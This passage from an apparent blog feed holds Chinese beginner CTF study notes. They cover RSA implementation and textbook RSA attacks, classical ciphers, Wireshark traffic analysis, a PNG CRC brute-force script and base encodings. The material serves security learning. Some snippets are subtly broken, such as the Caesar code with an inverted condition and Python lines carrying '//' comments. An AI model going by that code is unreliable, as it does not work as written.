p*q</span><br><span class="line">c &#x3D; pow(m, e, n)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><h2 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p &#x3D; </span><br><span class="line">q &#x3D; </span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; </span><br><span class="line">d &#x3D; inverse(e, (p-1)*(q-1))</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h1 id="使用RSA通信"><a href="#使用RSA通信" class="headerlink" title="使用RSA通信"></a>使用RSA通信</h1><h2 id="Alice发送公钥给Bob"><a href="#Alice发送公钥给Bob" class="headerlink" title="Alice发送公钥给Bob"></a>Alice发送公钥给Bob</h2><p>首先生成两个素数p和q, 相乘得到n, 然后随机生成一个小于n的素数e, 计算出e关于(p-1)*(q-1)的逆元作为密钥d。将(e, n)作为公钥发送给Bob，私钥d自己保留。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">e &#x3D; 65537</span><br><span class="line">p, q &#x3D; getPrime(128), getPrime(128)</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">d &#x3D; inverse(e, (p-1)*(q-1))</span><br><span class="line">print(&quot;n&#x3D;&quot;, n)</span><br><span class="line">print(&quot;d&#x3D;&quot;, d)</span><br></pre></td></tr></table></figure><h2 id="Bob使用Alice的公钥加密"><a href="#Bob使用Alice的公钥加密" class="headerlink" title="Bob使用Alice的公钥加密"></a>Bob使用Alice的公钥加密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">e &#x3D; 65537</span><br><span class="line">n &#x3D; </span><br><span class="line">m &#x3D; 123456&#x2F;&#x2F;明文</span><br><span class="line">c &#x3D; pow(m, e, n)&#x2F;&#x2F;密文</span><br><span class="line">print(&quot;c&#x3D;&quot;, c)</span><br></pre></td></tr></table></figure><h2 id="Alice使用私钥解密"><a href="#Alice使用私钥解密" class="headerlink" title="Alice使用私钥解密"></a>Alice使用私钥解密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">d &#x3D; </span><br><span class="line">n &#x3D; </span><br><span class="line">c &#x3D; </span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">print(&quot;m&#x3D;&quot;, m)</span><br></pre></td></tr></table></figure><h1 id="攻击加密算法"><a href="#攻击加密算法" class="headerlink" title="攻击加密算法"></a>攻击加密算法</h1><p>第三方窃听通信流程，就只能获取到Alice的公钥(e, n)和Bob发送的密文c。</p><h2 id="分解素因数攻击"><a href="#分解素因数攻击" class="headerlink" title="分解素因数攻击"></a>分解素因数攻击</h2><p>需要知道私钥d, 而d是e关于(p-1)*(q-1)的逆元，因此需要知道φ(n)，也就是得知道n的素因数分解。</p><p>在线分解网站：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.alpertron.com.ar&#x2F;ECM.HTM</span><br><span class="line">http:&#x2F;&#x2F;www.factordb.com&#x2F;index.php</span><br></pre></td></tr></table></figure><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>使用了相同的n对相同的明文m进行加密。</p><p><img src="https://i.loli.net/2021/02/16/oxm2z8QLadEYU5k.png" alt="image-20210216114535541"></p><h2 id="已知p-q或p-q"><a href="#已知p-q或p-q" class="headerlink" title="已知p+q或p-q"></a>已知p+q或p-q</h2><p>或者其它p,q之间的关系。解方程组：<br>$$<br>p*q = n,</p><p>p+q = a<br>$$<br>使用SageMath解方程组。<br>$$<br>var(‘p q’), </p><p>solve([p*q==n, p+q==a], [p, q])<br>$$</p><h2 id="小公钥指数攻击"><a href="#小公钥指数攻击" class="headerlink" title="小公钥指数攻击"></a>小公钥指数攻击</h2><p>e很小，c就可能被枚举出来。存在一个k, 满足：m<sup>e</sup>=c + k<em>n. 如果e=3, 那么：</em>m<sup>3</sup> = c + k*n, 枚举k并开根，能够刚好开根的就是解。</p><h2 id="已知e-d分解n"><a href="#已知e-d分解n" class="headerlink" title="已知e, d分解n"></a>已知e, d分解n</h2><p><img src="https://i.loli.net/2021/02/16/Epd2OZgnY4S1QWm.png" alt="image-20210216115428443"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天主要学习RSA。&lt;/p&gt;
&lt;h1 id=&quot;简单实现RSA&quot;&gt;&lt;a href=&quot;#简单实现RSA&quot; class=&quot;headerlink&quot; title=&quot;简单实现RSA&quot;&gt;&lt;/a&gt;简单实现RSA&lt;/h1&gt;&lt;h2 id=&quot;求逆元&quot;&gt;&lt;a href=&quot;#求逆元&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-crypt（二）" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-crypt（一）</title>
    <link href="https://ggyggy666.github.io/2021/02/15/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypto%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/02/15/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypto%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-02-15T11:09:23.000Z</published>
    <updated>2021-02-16T03:17:04.149Z</updated>
    
    <content type="html"><![CDATA[<p>今天开始学习crypt。地址：39.100.234.129</p><h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><p>实质就是替代，使用一个密码表，将26个字母偏移一定的顺序一一替代。</p><p>加密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from string import ascii_uppercase</span><br><span class="line"></span><br><span class="line">Plaintext &#x3D; &quot;GGY&quot;</span><br><span class="line">key &#x3D; 3&#x2F;&#x2F;偏移3</span><br><span class="line"></span><br><span class="line">Plaintext &#x3D; Plaintext.upper()</span><br><span class="line">Ciphertext &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in Plaintext:</span><br><span class="line">if i not in ascii_uppercase:</span><br><span class="line">Ciphertext +&#x3D; i</span><br><span class="line">else:</span><br><span class="line">Ciphertext +&#x3D; chr(((ord(i)-ord(&quot;A&quot;)-key) % 26) + ord(&quot;A&quot;))</span><br><span class="line">print(Ciphertext)</span><br><span class="line">&#x2F;&#x2F;得到密文DDV</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from string import ascii_uppercase</span><br><span class="line"></span><br><span class="line">Ciphertext &#x3D; &quot;DDV&quot;</span><br><span class="line">Ciphertext &#x3D; Ciphertext.upper()</span><br><span class="line"></span><br><span class="line">def shift(key):</span><br><span class="line">Plaintext &#x3D; &quot;&quot;</span><br><span class="line">for i in Ciphertext:</span><br><span class="line">if i not in ascii_uppercase:</span><br><span class="line">Plaintext +&#x3D; chr(((ord(i)-ord(&quot;A&quot;)-key) % 26) + ord(&quot;A&quot;))</span><br><span class="line">return Plaintext</span><br><span class="line"></span><br><span class="line">for key in range(26):</span><br><span class="line">print(shift(key))</span><br></pre></td></tr></table></figure><p>由于不知道key是多少，因此需要遍历26个字母。得到</p><p><img src="https://i.loli.net/2021/02/15/39KklVbFIA4MetZ.png" alt="image-20210215210959362"></p><h1 id="关键词加密"><a href="#关键词加密" class="headerlink" title="关键词加密"></a>关键词加密</h1><p>选取一个关键词，如果有重复的字母，就去掉。比如success，就得到suces。重复的c和s就去掉了。关键词加密，需要写成两行的形式，第一行是从a到z的正常顺序字母。第二行就是先写给出的关键词，然后将后面填充上字母，规则是：按照第一行的顺序，看到某个字母，看第二行的关键词是否已经有了这个字母，有了就跳过，没有就填充到第二行后面。比如：</p><p>密文是：agqr{yue_stdcgciup_padas}</p><p>关键词key是：angstromcf</p><p>那么可以构建两行：</p><p><img src="https://i.loli.net/2021/02/15/r3EfCH9Dyt5gINY.png" alt="image-20210215211905103"></p><p>第一行是a-z, 第二行先写关键词。后面填充，a已经出现了，轮到b,没有就填充，轮到c, 已经存在了，轮到d， 没有就填充……由此得到密码表。</p><p><img src="https://i.loli.net/2021/02/15/HRokE9BdpnrFjYP.png" alt="image-20210215212023039"></p><p>根据密码表一一对应得到flag。</p><h1 id="仿射加密"><a href="#仿射加密" class="headerlink" title="仿射加密"></a>仿射加密</h1><p>加密：</p><p><img src="https://i.loli.net/2021/02/15/lU3R4c5xz6brACE.png" alt="image-20210215212229871"></p><p>p是明文，c是密文。a与26互素。解密则是：</p><p><img src="https://i.loli.net/2021/02/15/16jNUsAiWSBVQzv.png" alt="image-20210215212404151"></p><p>需要算出a的逆元。可以用python：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import invert</span><br><span class="line">print(invert(5, 26))</span><br><span class="line">&#x2F;&#x2F;求5关于26的逆元</span><br></pre></td></tr></table></figure><p>加密：</p><p><img src="https://i.loli.net/2021/02/15/F2BmOPRngMAL7iQ.png" alt="image-20210215213432807"></p><p>解密：</p><p><img src="https://i.loli.net/2021/02/15/I9f1zSMbZi6xFEO.png" alt="image-20210215213501563"></p><h1 id="单表代替"><a href="#单表代替" class="headerlink" title="单表代替"></a>单表代替</h1><p>爆破的话有26！，太大了难以爆破。需要一些解密手段。比如密文的字母频率，然后与已知的字母频率表对应从而可以得到密码表。</p><p>快速破解单表代替密码网站：<a href="http://quipqiup.com/" target="_blank" rel="noopener">http://quipqiup.com/</a></p><h1 id="维吉尼亚加密"><a href="#维吉尼亚加密" class="headerlink" title="维吉尼亚加密"></a>维吉尼亚加密</h1><p>多表代替，本质是多个凯撒加密。</p><p>明文是：ATTACKKATDAWN</p><p>关键词是：LEMON, 可以发现关键词的长度比明文短，此时可以重复关键词，得到：LEMONLEMONLE</p><p>然后查表：</p><p><img src="https://i.loli.net/2021/02/15/vwVxPcXKi3Y46SO.png" alt="image-20210215214507883"></p><p>可以看出这个表是从A-Z的字母表，每一行每一列都是从对应的字母开始的。加密过程：第一个字母是A，对应关键词第一个字母是L，那么就查看A列L行，得到L，以此类推。最终得到密文：LXFOPVEFRNHR。</p><p>解密过程：查看密文第一个字母是L，对应关键词第一个字母是L，那么先查看L行，在L行中找到L，对应的列是A，即可得到明文A。</p><p>可以避免字母频率分析攻击，但是有缺点：一个字符在明文中重复，密钥对应部分也相同，得到的密文部分也是重复的。</p><h1 id="替换和编码"><a href="#替换和编码" class="headerlink" title="替换和编码"></a>替换和编码</h1><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><p><img src="https://i.loli.net/2021/02/15/f19OPXNtGwkCDYQ.png" alt="image-20210215215604406"></p><h2 id="字符串和字节类型转换"><a href="#字符串和字节类型转换" class="headerlink" title="字符串和字节类型转换"></a>字符串和字节类型转换</h2><p><img src="https://i.loli.net/2021/02/15/lYHo84FQ751EhUu.png" alt="image-20210215215636716"></p><h2 id="base64编码解码"><a href="#base64编码解码" class="headerlink" title="base64编码解码"></a>base64编码解码</h2><p><img src="https://i.loli.net/2021/02/15/O29vbFMPQiJSoDR.png" alt="image-20210215215710177"></p><h2 id="整形和字节类型转换"><a href="#整形和字节类型转换" class="headerlink" title="整形和字节类型转换"></a>整形和字节类型转换</h2><p><img src="https://i.loli.net/2021/02/15/PcqyNamCRil5TOu.png" alt="image-20210215215740413"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天开始学习crypt。地址：39.100.234.129&lt;/p&gt;
&lt;h1 id=&quot;凯撒密码&quot;&gt;&lt;a href=&quot;#凯撒密码&quot; class=&quot;headerlink&quot; title=&quot;凯撒密码&quot;&gt;&lt;/a&gt;凯撒密码&lt;/h1&gt;&lt;p&gt;实质就是替代，使用一个密码表，将26个字母偏移一定
      
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-crypt（一）" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>README</title>
    <link href="https://ggyggy666.github.io/2021/02/15/README/"/>
    <id>https://ggyggy666.github.io/2021/02/15/README/</id>
    <published>2021-02-15T11:08:09.884Z</published>
    <updated>2021-02-15T11:08:10.078Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-misc（三）</title>
    <link href="https://ggyggy666.github.io/2021/02/09/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/02/09/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2021-02-09T10:51:56.000Z</published>
    <updated>2021-02-15T14:04:49.235Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习第三课——流量分析。</p><h1 id="互联网五层模型"><a href="#互联网五层模型" class="headerlink" title="互联网五层模型"></a>互联网五层模型</h1><p>应用层——传输层——网络层——链路层——物理层。</p><h1 id="WireShark的基本使用"><a href="#WireShark的基本使用" class="headerlink" title="WireShark的基本使用"></a>WireShark的基本使用</h1><ol><li><p>首先打开Wireshark，会查找本地接口。</p><p><img src="https://i.loli.net/2021/02/09/FEQdLJfCP3r2vsX.png" alt="image-20210209185805188"></p></li></ol><p>​    选择WLAN点击，就能收到一堆流量包。</p><ol start="2"><li><p>访问一个http网站：<a href="http://zj.gsxt.gov.cn/，可以发现导航栏中会显示不安全。在Wireshark中，过滤器那栏输入http，表示只显示http请求的流量包。" target="_blank" rel="noopener">http://zj.gsxt.gov.cn/，可以发现导航栏中会显示不安全。在Wireshark中，过滤器那栏输入http，表示只显示http请求的流量包。</a></p><p><img src="https://i.loli.net/2021/02/09/67aFXCSvWyPcgqx.png" alt="image-20210209190205889"></p><p>查看text/html的包，这就是返回包。</p><p><img src="https://i.loli.net/2021/02/09/rP51TFqmyBQdn7g.png" alt="image-20210209190623140"></p></li><li><p>访问一个https网站：<a href="https://etax.zhejiang.chinatax.gov.cn/，导航栏显示一把锁。那么http和https有什么区别呢？Wireshark过滤器输入：http" target="_blank" rel="noopener">https://etax.zhejiang.chinatax.gov.cn/，导航栏显示一把锁。那么http和https有什么区别呢？Wireshark过滤器输入：http</a> and http.request.uri contain “index.html”, 再去访问一遍https网站，发现没有index.html访问路径的流量包，访问http网站，显示了流量包。（过滤器是http的当然没有https的咯。。）</p><p><img src="https://i.loli.net/2021/02/09/T9oVfwix3a5UqQp.png" alt="image-20210209191127467"></p></li><li><p>查看https的需要输入tls, 显示出来的是加密过的东西。</p><p><img src="https://i.loli.net/2021/02/09/ugsOiFbyJa3HERl.png" alt="image-20210209191616741"></p></li><li><p>导出对象，过滤器输入http，停止捕获，点击文件——导出对象——选择http，之后保存就可以了。或者选定一个TCP数据包，右键点击追踪流，选择TCP流，之后弹出的框中选择原始数据，另存为文件。使用010打开即可。</p></li><li><p>保存整个流量，结尾是pcapng。</p></li></ol><h1 id="终端互相通信"><a href="#终端互相通信" class="headerlink" title="终端互相通信"></a>终端互相通信</h1><h2 id="两台电脑直接相连"><a href="#两台电脑直接相连" class="headerlink" title="两台电脑直接相连"></a>两台电脑直接相连</h2><p><img src="https://i.loli.net/2021/02/09/LqykD6oUcK75fOb.png" alt="image-20210209191927226"></p><p>给PC0和PC1分配各自的静态IP，然后在PC0的终端中去pingPC1。</p><p><img src="https://i.loli.net/2021/02/09/J97MRunbAQlWmzc.png" alt="image-20210209192128893"></p><p>直接ping通了。</p><h2 id="多台电脑相连"><a href="#多台电脑相连" class="headerlink" title="多台电脑相连"></a>多台电脑相连</h2><p>两台相同的电脑相连，只需要一条虚线连接。但是多台电脑相连就不行了，因为电脑那里端口有限，如果每连接一个终端就需要增加一个端口，这显然不可能。因此需要一个中介。</p><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p>电脑与集线器相连，由于是不同设备，就需要直实线了。给新增的PC2配置IP：192.168.1.102，在PC0上ping一下：</p><p><img src="https://i.loli.net/2021/02/09/o97SXn4eUgVp6Hb.png" alt="image-20210209192833113"></p><p>但是集线器有一个缺点。PC0向另一个PC发送消息时集线器是向其他所有PC发送的，如果这时有一个黑客连进来了，就会监听到，很不安全。</p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p>与集线器类似，都是实线连接。</p><p><img src="https://i.loli.net/2021/02/09/xkDvB4nWCNAafdO.png" alt="image-20210209193158257"></p><p>交换机就比较安全了。因为两个终端通信时，不仅需要IP，还需要一个MAC地址。交换机根据MAC地址发送到对应的目的端口，这样就不会发送给其它人了。而IP-MAC地址表就是ARP表。如果想要发送给多个人，就可以将目的MAC地址修改成00即广播地址。ARP表中没有IP对应的目的MAC地址，需要启动ARP寻址。</p><p><img src="https://i.loli.net/2021/02/09/1gwOjLWFMTq3lEf.png" alt="image-20210209193606167"></p><p>三次握手：SYN——SYN，ACK——ACK</p><p><img src="https://i.loli.net/2021/02/09/aBJzL7GxkQ1XRny.png" alt="image-20210209194333634"></p><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><h2 id="上课认真听了吗"><a href="#上课认真听了吗" class="headerlink" title="上课认真听了吗"></a>上课认真听了吗</h2><p>题目显示是三种流量中查找flag。直接按照师傅说的方法来。</p><ol><li><p>下载附件打开，点击查找那个图标。选择“分组字节流”，“字符串”，查找flag{</p><p><img src="https://i.loli.net/2021/02/09/ahflszrxBOYwAXm.png" alt="image-20210209210132208"></p></li><li><p>不停点击右边的查找就能找到几个flag了，拼接即可。</p><p><img src="https://i.loli.net/2021/02/09/JvkuLR2iNtOx4Zc.png" alt="image-20210209210247067"></p></li></ol><h2 id="我是间谍"><a href="#我是间谍" class="headerlink" title="我是间谍"></a>我是间谍</h2><ol><li><p>下载附件imaspy.exe, Wireshark抓包WLAN，然后运行exe文件，即可捕获到流量。</p></li><li><p>按照上面的方法查找flag{即可拿到flag。</p><p><img src="https://i.loli.net/2021/02/09/GkSsCK4Rjr6LEb1.png" alt="image-20210209212609026"></p></li></ol><h2 id="简单流量"><a href="#简单流量" class="headerlink" title="简单流量"></a>简单流量</h2><ol><li><p>下载附件，打开流量包后，Wireshark中导入SSL密钥：编辑——首选项——Protocol中选择TLS，然后导入sslkey.log</p><p><img src="https://i.loli.net/2021/02/09/prEePsDjaVnZ2mH.png" alt="image-20210209214712251"></p></li><li><p>还是搜索字符串，但是要注意，必须是字符分组而不是字符字节流了。</p><p><img src="https://i.loli.net/2021/02/09/tmcEwQCe5ZJB7FI.png" alt="image-20210209214844799"></p></li><li><p>找到之后，将其URL解码就行了。</p><p><img src="https://i.loli.net/2021/02/09/ta4iWHGjTCNrs9Z.png" alt="image-20210209214945700"></p></li></ol><h2 id="监听消息"><a href="#监听消息" class="headerlink" title="监听消息"></a>监听消息</h2><ol><li><p>下载附件，打开，使用Wireshark打开流量包。</p><p><img src="https://i.loli.net/2021/02/09/3UZvuV4dY2zgOM5.png" alt="image-20210209223855539"></p></li><li><p>尝试搜索flag无果。右键追踪流，发现一堆十六进制的字符。</p><p><img src="/2021/02/09/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210209224006300.png" alt="image-20210209224006300"></p></li><li><p>将这些字符串复制到010中，发现是PNG格式的</p><p><img src="https://i.loli.net/2021/02/09/IB5xHpNtqjQioO4.png" alt="image-20210209224054086"></p></li><li><p>但是使用PNG模板时报错了，另存为PNG图片也不乏显示。应该是校验和不对，也就是图片的宽高不对导致校验和不对。因此使用脚本爆破高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc &#x3D; open(&quot;listen.png&quot;,&quot;rb&quot;).read()</span><br><span class="line">#print(misc[0x0c:0x0f+1])</span><br><span class="line"># 爆破高</span><br><span class="line"></span><br><span class="line">crc32_bytes &#x3D; misc[0x1d:0x20+1]# 读出bytes</span><br><span class="line">crc32_hex_eval &#x3D; eval(&#39;0x&#39; + crc32_bytes.hex())#bytes串 -&gt; hex串  -&gt;  值</span><br><span class="line">print(crc32_hex_eval)</span><br><span class="line">for i in range(4096):</span><br><span class="line">    data &#x3D; misc[0x0c:0x0f+1] + misc[0x10:0x13+1] + struct.pack(&#39;&gt;i&#39;,i)+ misc[0x18:0x1c+1]  #IHDR数据</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; crc32_hex_eval : #IHDR块的crc32值</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;height_hex:&quot;+ hex(i))</span><br></pre></td></tr></table></figure><p>最终得到高是100，十六进制就是64，因此010中修改高为64.</p><p><img src="https://i.loli.net/2021/02/09/WT5szBUQlDuF6ei.png" alt="image-20210209224545192"></p></li><li><p>保存成xxx.png之后，打开文件，发现是一张残缺的二维码。</p><p><img src="https://i.loli.net/2021/02/09/vrcy3HKCUd94bIA.png" alt="image-20210209224626750"></p></li><li><p>打开网站：<a href="https://merricx.github.io/qrazybox/，点击页面的Editor" target="_blank" rel="noopener">https://merricx.github.io/qrazybox/，点击页面的Editor</a> Mode</p><p><img src="https://i.loli.net/2021/02/09/afRBA6w5VNeHpIQ.png" alt="image-20210209224718618"></p><p>将右上角的框框截下来保存成code.png。</p></li><li><p>打开PS，新建文件，加载进来这两张图片(xxx.png和code.png)，按照大小组装好</p><p><img src="https://i.loli.net/2021/02/09/rdUApzielj81m47.png" alt="image-20210209224857923"></p><p>扫一扫即可。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天学习第三课——流量分析。&lt;/p&gt;
&lt;h1 id=&quot;互联网五层模型&quot;&gt;&lt;a href=&quot;#互联网五层模型&quot; class=&quot;headerlink&quot; title=&quot;互联网五层模型&quot;&gt;&lt;/a&gt;互联网五层模型&lt;/h1&gt;&lt;p&gt;应用层——传输层——网络层——链路层——物理层。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-misc（三）" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-misc（二）</title>
    <link href="https://ggyggy666.github.io/2021/02/03/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/02/03/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-02-03T07:57:18.000Z</published>
    <updated>2021-02-09T04:53:02.698Z</updated>
    
    <content type="html"><![CDATA[<p>今天继续学习misc, 主要是各种编码。</p><p>各种编码集合的文章：<a href="https://blog.csdn.net/dyw_666666/article/details/89973048" target="_blank" rel="noopener">https://blog.csdn.net/dyw_666666/article/details/89973048</a></p><h1 id="常见进制"><a href="#常见进制" class="headerlink" title="常见进制"></a>常见进制</h1><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><p><strong>二进制转ASCII码</strong></p><p>01101110 01100101 01110000</p><p>对应的ASCII码：nep</p><p><strong>二进制转Morse码</strong></p><p>二进制先转成ASCII码，得到.或者-, 就可以组合成Morse码</p><p><img src="https://i.loli.net/2021/02/03/5wHgA7cQDYjbXp3.png" alt="image-20210203160344540"></p><p>还可以直接使用CyberChef。</p><p><strong>二进制转成二维码</strong></p><p><img src="https://i.loli.net/2021/02/03/H2C8lWqG9RdsEok.png" alt="image-20210203160733605"></p><p>将二进制字符串放到str中。然后根据这个字符串长度进行开方，放到MAX中。比如上图，625个数字，开方得到25，因此MAX=25.</p><h2 id="二进制转hex十六进制"><a href="#二进制转hex十六进制" class="headerlink" title="二进制转hex十六进制"></a>二进制转hex十六进制</h2><ol><li><p>下载bin.txt, 写一个python脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;bin.txt&quot;, &#39;r&#39;) as f:</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        print(hex(int(line, 2)))</span><br></pre></td></tr></table></figure><p>就可以得到十六进制的字符串。</p></li><li><p>复制字符串，打开010，新建一个文件，选择hex, 然后使用Ctrl+Shift+V粘贴（必须要shift！），之后按F5，模板选择JPG，run，然后另存为图片bin.jfif</p><p><img src="https://i.loli.net/2021/02/08/bx187BQSs9JnzOY.png" alt="image-20210208202750898"></p></li></ol><h1 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h1><p><img src="https://i.loli.net/2021/02/03/ZGUwgASqCLoQIiX.png" alt="image-20210203161145334"></p><h2 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h2><p>base64: 把3个8位的字节转化为4个6位的字节，之后在每6位字节前加上2个0，构成4个8位的。=是填充字符。</p><p>base32：使用32个字符（A-Z和2-7）。末尾最多6个=</p><p>base16：使用0-9和A-F。不会出现=。</p><p>base36: 0-9和26个字母，不区分大小写。要么全大写，要么全小写。加密仅支持数字，解密仅支持字符串。</p><p>base58：数字和字母，去掉了0和O，I和l（大写i和小写l）。58个</p><p>base62: 26个字母大小写和0-9</p><p>base91、base92等</p><h3 id="base64还原成图片"><a href="#base64还原成图片" class="headerlink" title="base64还原成图片"></a>base64还原成图片</h3><p>将base64.txt里的东西复制下来，然后访问：<code>http://tool.chinaz.com/tools/imgtobase/</code>, 粘贴，还原即可得到一个二维码。扫一扫就能得到图片。</p><h3 id="base编码转换"><a href="#base编码转换" class="headerlink" title="base编码转换"></a>base编码转换</h3><p>密文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LJWXQ2C2GN2EGTSIJZWFQ6SGPJMHUTTIMMZWW2DGKE6T2&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>打开网站：<code>https://www.qtool.net/baseencode</code></p><p>将密文复制进去，先使用base32解码，得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tCNHNlXzFzXzNhc3khfQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>然后使用base64解码得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 